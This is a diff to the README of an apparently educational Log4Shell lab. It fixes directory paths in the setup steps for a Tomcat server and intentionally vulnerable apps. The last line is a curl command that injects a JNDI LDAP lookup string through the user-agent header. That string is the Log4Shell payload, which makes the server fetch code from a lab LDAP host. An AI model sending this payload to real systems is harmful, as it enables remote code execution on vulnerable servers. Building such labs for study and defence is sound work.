@@ -26,7 +26,7 @@ git clone https://github.com/Cyb3rWard0g/log4jshell-lab
 run the bash script `Install-Tomcat.sh` to install and set up a [Tomcat](https://tomcat.apache.org/) server:
 
 ```Bash
-cd log4jshell-lab/victim/
+cd log4jshell-lab/victim/tomcat
 
 sh Install-Tomcat.sh
 ```
@@ -61,7 +61,7 @@ We need to compile our applications and create `.war` files to host the vulnerab
 The bash script `Compile-Apps.sh` compiles applications and copies `.war` files to `/opt/tomcat/webapps`:
 
 ```bash
-cd vuln-apps/
+cd log4jshell-lab/victim/vuln-apps/
 chmod +x Compile-Apps.sh
 
 sh Compile-Apps.sh
@@ -93,7 +93,7 @@ ssh -L 8080:127.0.0.1:8080 wardog@[Public-IP-Linux-VM]
 ### API Mode
 * You can also SSH to your Tomcat server and interact with the application's basic API.
 * You can use `curl` to perform a `GET` request:
-* This mode require you to pass the `JNDI lookup` string via the `user-agent` header of the `GET` request.
+* You must pass the `JNDI lookup` string via the `user-agent` header of the `GET` request:
 
 ```bash
 curl -X GET -H 'user-agent: ${jndi:ldap://192.168.2.6:1389/o=tomcat}' 127.0.0.1:8080/Log4j-2.*.0-SNAPSHOT/api
